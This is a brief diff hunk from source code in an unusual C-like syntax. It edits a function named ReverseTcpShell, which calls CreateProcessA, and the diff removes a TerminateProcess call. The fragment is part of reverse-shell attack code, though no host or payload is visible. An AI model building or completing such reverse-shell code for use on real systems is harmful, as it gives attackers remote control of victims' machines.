@@ -15,6 +15,5 @@ int fn ReverseTcpShell(int ip, int port) {
    array process_info int[4];
    startup_info[0] = 0x44;
    CreateProcessA(0, cmd_line, 0, 0, 1, 0, 0, 0, startup_info, process_info);
-   TerminateProcess(0, 0xffffffff);
    return 1;
 }
